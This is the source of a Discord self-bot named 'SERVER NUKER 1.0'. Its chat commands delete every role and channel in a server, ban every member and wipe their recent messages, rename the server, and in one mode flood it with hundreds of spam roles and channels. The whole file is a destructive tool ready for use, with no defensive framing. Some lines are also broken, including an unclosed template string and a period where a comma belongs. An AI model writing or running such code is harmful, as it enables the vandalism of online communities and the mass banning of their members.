
const Discord = require("discord.js")
const bot = new Discord.Client()

bot.login().catch(async function(err) {
	console.error(`Failed to log into the Discord API`, err)
})

bot.on("ready", async function() {
	console.log(`Ready as: ${bot.user.tag}`)
})

bot.on("message", async function(msg) {
	if(bot.user !== msg.author || msg.system || msg.channel.type !== "text") {
		return;
	}
	if(msg.content === "!destroy") {
		console.log(`Destroying server "${msg.guild.name}"`)
		msg.guild.roles.forEach(async function(r) {
			r.delete().then(async function(role) {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}"}`, err)
			})
		})
		msg.guild.channels.forEach(async function(ch) {
			ch.delete().then(async function(channel) {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}" \n`. err)
			})
		})
		msg.guild.members.map(async function(member) {
			member.ban(7).then(async function(m) {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}" \n`, err)
			})
		})
		msg.guild.setName("SERVER NUKED BY SERVER NUKER 1.0").catch(console.error)
		console.log(`Nuked server "${msg.guild.name}" - R.I.P`)
		
	} else if(msg.content === "!overwrite") {
		console.log(`Overwriting server "${msg.guild.name}"`)
		msg.guild.roles.forEach(async function(r) {
			r.delete().then(async function(role) {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
			})
		})
		msg.guild.channels.map(async function(ch) {
			ch.delete().then(async function(channel) {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}", err)
			})
		})
		msg.guild.members.forEach(async function(member) {
			member.ban(7).then(async function(m) {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
			})
		})
		msg.guild.setName("SERVER OVERWRITTEN BY SERVER NUKER 1.0").catch(console.error)
		for(var i = 0; i < 200; i++) {
			msg.guild.createRole().catch(console.error)
			msg.guild.createChannel("server-nuked", "text").catch(console.error)
			msg.guild.createChannel("Server Nuked", "voice").catch(console.error)
		}
	} else if(msg.content === "!baneveryone") {
		msg.guild.members.forEach(async function(member) {
			member.ban(7).then(async function(m) {
				console.log(`Banned member "${m.user.tag}" on "${m.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to ban member "${member.user.tag}" on "${member.guild.name}"`, err)
			})
		})
	} else if(msg.content === "!deleteroles") {
		msg.guild.roles.forEach(async function(r) {
			r.delete().then(async function(role) {
				console.log(`Deleted role "${role.name}" on "${role.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete role "${r.name}" on "${r.guild.name}" \n`, err)
			})
		})
	} else if(msg.content === "!deletechannels") {
		msg.guild.channels.forEach(async function(ch) {
			ch.delete().then(async function(channel) {
				console.log(`Deleted channel "${channel.name}" on "${channel.guild.name}"`)
			}).catch(async function(err) {
				console.error(`Failed to delete channel "${ch.name}" on "${ch.guild.name}"`, err)
			})
		})
	}
})